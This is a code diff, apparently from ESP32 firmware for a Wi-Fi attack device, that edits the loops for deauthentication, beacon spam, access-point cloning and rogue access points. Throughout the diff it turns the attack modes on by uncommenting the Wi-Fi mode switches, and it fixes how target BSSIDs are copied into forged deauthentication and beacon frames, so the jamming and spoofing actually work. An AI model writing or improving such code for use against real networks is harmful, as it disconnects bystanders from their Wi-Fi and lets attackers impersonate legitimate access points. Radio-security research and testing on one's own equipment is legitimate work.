@@ -15,7 +15,8 @@ extern "C" {
 
 struct ap {
 	String ssid;
-	String bssid;
+	String bssid_str;
+	uint8_t* bssid;
 	float rssi;
 };
 
@@ -67,18 +68,16 @@ public:
 	}
 
 	void deauthLoop() {
-		if (!updateScanAp()) {
-			l.log(Logger::ERROR, "Failed to scan nearby AP to deauth");
-			return;
-		}
-
 		loop_deauth_ap = !loop_deauth_ap;
 		l.log(Logger::INFO, loop_deauth_ap ? "Starting deauth loop" : "Stopping deauth loop");
 	
-		if (!loop_spam_ap)
+		if (!loop_deauth_ap) 
 			return led.flash(2);
 
-		// esp_wifi_set_mode(WIFI_MODE_AP);
+		if (!updateScanAp()) 
+			return l.log(Logger::ERROR, "Failed to scan nearby AP to deauth");
+
+		esp_wifi_set_mode(WIFI_MODE_AP);
 		led.flash();
 	}
 
@@ -87,45 +86,40 @@ public:
 
 		l.log(Logger::INFO, loop_spam_ap ? "Starting access point spam loop" : "Stopping access point spam loop");
 
-		if (!loop_spam_ap)
+		if (!loop_spam_ap) 
 			return led.flash(2);
 
-		// esp_wifi_set_mode(WIFI_MODE_APSTA);
+		esp_wifi_set_mode(WIFI_MODE_APSTA);
 		led.flash();
 	}
 
 	void cloneAPLoop() {
-		if (!updateScanAp()) {
-			l.log(Logger::ERROR, "Failed to scan nearby AP to deauth");
-			return;
-		}
-
 		loop_clone_spam_ap = !loop_clone_spam_ap;
 
 		l.log(Logger::INFO, loop_clone_spam_ap ? "Starting access point clone spam loop" : "Stopping access point clone spam loop");
 
-		if (!loop_clone_spam_ap)
+		if (!loop_clone_spam_ap) 
 			return led.flash(2);
 
-		// esp_wifi_set_mode(WIFI_MODE_APSTA);
-		led.flash();
+		if (!updateScanAp()) 
+			return l.log(Logger::ERROR, "Failed to scan nearby AP to deauth");
 
+		esp_wifi_set_mode(WIFI_MODE_APSTA);
+		led.flash();
 	}
 
 	void rogueAPloop() {
-		if (!updateScanAp()) {
-			l.log(Logger::ERROR, "Failed to scan nearby AP to deauth");
-			return;
-		}
-
 		loop_rogue_ap = !loop_rogue_ap;
 
 		l.log(Logger::INFO, loop_rogue_ap ? "Starting access point rogue attack loop" : "Stopping access point rogue attack loop");
 
-		if (!loop_rogue_ap)
+		if (!loop_rogue_ap) 
 			return led.flash(2);
+		
+		if (!updateScanAp()) 
+			return l.log(Logger::ERROR, "Failed to scan nearby AP to deauth");
 
-		// esp_wifi_set_mode(WIFI_MODE_AP);
+		esp_wifi_set_mode(WIFI_MODE_AP);
 		led.flash();
 	}
 
@@ -144,7 +138,7 @@ public:
 			Serial.print("Network SSID: ");
 			Serial.print(scanned_ap[i].ssid);
 			Serial.print("(");
-			Serial.print(scanned_ap[i].bssid);
+			Serial.print(scanned_ap[i].bssid_str);
 			Serial.print(")");
 			Serial.print("[");
 			Serial.print(scanned_ap[i].rssi);
@@ -195,7 +189,7 @@ public:
 			for (int i = 0; i < scanned_ap_count; i++) {
 				if (scanned_ap[i].bssid == nullptr) break;
 				String ssid = scanned_ap[i].ssid;
-				String bssid = scanned_ap[i].bssid;
+				uint8_t* bssid = scanned_ap[i].bssid;
 
 				beacon(ssid, bssid);
 			}
@@ -206,11 +200,11 @@ public:
 				if (scanned_ap[i].bssid == nullptr) break;
 
 				String ssid = scanned_ap[i].ssid;
-				String bssid = scanned_ap[i].bssid;
-				if (ssid.length() > 0) {
-					deauth(bssid.c_str());
-					l.log(Logger::INFO, "Deauthing " + ssid + " (" + bssid + ")");
-				}
+				String bssid_s = scanned_ap[i].bssid_str;
+				uint8_t* bssid = scanned_ap[i].bssid;
+
+				deauth(bssid);
+				l.log(Logger::INFO, "Deauthing " + ssid + " (" + bssid_s + ")");
 			}
 		}
 
@@ -266,14 +260,15 @@ private:
 		int numNetworks = WiFi.scanNetworks();
 		for (int i = 0; i < (numNetworks > 10 ? 10 : numNetworks); i++) {
 			scanned_ap[i].ssid = WiFi.SSID(i);
-        	scanned_ap[i].bssid = WiFi.BSSIDstr(i);
+        	scanned_ap[i].bssid_str = WiFi.BSSIDstr(i);
+        	scanned_ap[i].bssid = WiFi.BSSID(i);
         	scanned_ap[i].rssi = WiFi.RSSI(i);
 		}
 
 		return numNetworks != 0;
 	}
 
-	void beacon(String ssid, String bssid) {
+	void beacon(String ssid, uint8_t* bssid) {
 		int ssidLen = ssid.length();
 
 		if (ssidLen > 32)
@@ -290,9 +285,9 @@ private:
 		memcpy(buffer, beacon_packet, beacon_packet_size);
 
 		// Write the MAC address to the packet
-		const char* bssid_c = bssid.c_str();
-		memcpy(&buffer[10], bssid_c, 6);
-		memcpy(&buffer[16], bssid_c, 6);
+		// const char* bssid_c = bssid.c_str();
+		memcpy(&buffer[10], bssid, 6);
+		memcpy(&buffer[16], bssid, 6);
 
 		// Write the SSID to the packet
 		const char* ssid_c = ssid.c_str();
@@ -305,7 +300,7 @@ private:
 
 		// delete[] mac;
 
-		printBuffer(buffer, beacon_packet_size);
+		// printBuffer(buffer, beacon_packet_size);
 
 		for (int i = 0; i < 3; i++) {
 			esp_wifi_80211_tx(WIFI_IF_STA, buffer, beacon_packet_size, 0);
@@ -349,23 +344,23 @@ private:
 		}
 	}
 
-	void deauth(const char* bssid) {
+	void deauth(uint8_t* bssid) {
 		switchChannel();
 
 		uint8_t buffer[deauth_packet_size];
     	memcpy(buffer, deauth_packet, deauth_packet_size);
 
-		sscanf(bssid, "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx",
-				&buffer[10], &buffer[11], &buffer[12], &buffer[13], &buffer[14], &buffer[15]);
-
-		sscanf(bssid, "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx",
-				&buffer[16], &buffer[17], &buffer[18], &buffer[19], &buffer[20], &buffer[21]);
+		memcpy(&buffer[10], bssid, 6);
+		memcpy(&buffer[16], bssid, 6);
 
 		/**
 		 * @attention This is not working for some reason
-		 * Its setting the mac address to different bytes. it might be because its a char
-		 * memcpy(&buffer[10], bssid, 6);
-		 * memcpy(&buffer[16], bssid, 6);
+		 * Its setting the mac address to different bytes. it might be because its a const char
+		 * sscanf(bssid, "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx",
+		 * 		&buffer[10], &buffer[11], &buffer[12], &buffer[13], &buffer[14], &buffer[15]);
+		 * 
+		 * sscanf(bssid, "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx",
+		 * 		&buffer[16], &buffer[17], &buffer[18], &buffer[19], &buffer[20], &buffer[21]);
 		 */
 
 		// printBuffer(buffer, deauth_packet_size);
